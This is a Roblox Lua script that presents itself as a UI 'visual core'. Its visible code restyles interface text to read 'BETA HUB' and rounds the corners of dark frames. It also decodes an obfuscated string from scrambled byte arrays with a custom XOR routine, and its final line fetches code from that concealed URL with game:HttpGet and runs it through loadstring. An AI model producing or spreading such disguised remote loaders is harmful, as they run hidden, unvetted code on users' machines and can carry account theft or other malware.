
--[[ STAGE 2: VISUAL CORE ]]
local DY_ugjxpNoC5eXffzFHI3 = bit32 and bit32.bxor
if not DY_ugjxpNoC5eXffzFHI3 then
    DY_ugjxpNoC5eXffzFHI3 = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function StkbDTjCNguB0eMMA0(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = DY_ugjxpNoC5eXffzFHI3(v, a)
        else
            v = DY_ugjxpNoC5eXffzFHI3(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local hrPM7hh4sxPFZGr5p8OVnqN10 = {
  {{169, 191, 1, 8, 28, 218}, 67, 128, 0, 7, true, 2},
  {{240, 248, 3}, 105, 236, 0, 4, false, 17},
  {{99, 72, 102, 84}, 136, 102, 0, 1, false, 4},
  {{54, 71, 89, 11, 68}, 105, 250, 1, 1, false, 20},
  {{9, 11, 1, 112, 7, 119, 120}, 177, 63, 1, 4, false, 5},
  {{146, 175, 148, 136, 126, 151}, 120, 132, 1, 7, false, 16},
  {{167, 165, 189, 204, 179, 176, 182}, 191, 212, 0, 3, false, 18},
  {{109, 100, 115, 127, 63}, 32, 19, 0, 6, false, 6},
  {{131, 252, 225, 201, 219, 32, 37}, 174, 248, 1, 6, false, 14},
  {{81, 66, 124, 108, 110, 117, 27}, 88, 160, 1, 7, false, 11},
  {{108, 66, 112, 106, 123, 42}, 157, 120, 1, 3, false, 15},
  {{91, 88, 90}, 78, 156, 1, 5, true, 12},
  {{34, 26, 28}, 92, 223, 0, 4, false, 7},
  {{83, 84, 151}, 204, 174, 0, 2, true, 8},
  {{89, 105, 84}, 236, 200, 0, 4, true, 21},
  {{199, 245, 207, 54, 51, 57, 63}, 178, 14, 1, 4, true, 19},
  {{224, 242, 173, 234}, 24, 107, 0, 4, true, 3},
  {{177, 182, 196, 198, 216, 222}, 142, 203, 1, 6, false, 9},
  {{117, 213, 155, 147, 159, 164}, 242, 240, 0, 4, false, 13},
  {{2, 231, 232, 237}, 52, 165, 0, 1, false, 1},
  {{141, 117, 83, 141, 125, 157}, 177, 172, 0, 3, true, 10}
}
local oHU6QwDYKQWjzqUlltDoHd8Pk = {}
for NjGvbsd9FKHxCyBrvSxvwu = 1, #hrPM7hh4sxPFZGr5p8OVnqN10 do
    local V7BXItITIIxC7TCqIj = hrPM7hh4sxPFZGr5p8OVnqN10[NjGvbsd9FKHxCyBrvSxvwu]
    oHU6QwDYKQWjzqUlltDoHd8Pk[V7BXItITIIxC7TCqIj[7]] = StkbDTjCNguB0eMMA0(V7BXItITIIxC7TCqIj[1], V7BXItITIIxC7TCqIj[2], V7BXItITIIxC7TCqIj[3], V7BXItITIIxC7TCqIj[4], V7BXItITIIxC7TCqIj[5], V7BXItITIIxC7TCqIj[6])
end
local osMjfjDdkM9OOw = table.concat(oHU6QwDYKQWjzqUlltDoHd8Pk)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(osMjfjDdkM9OOw))()
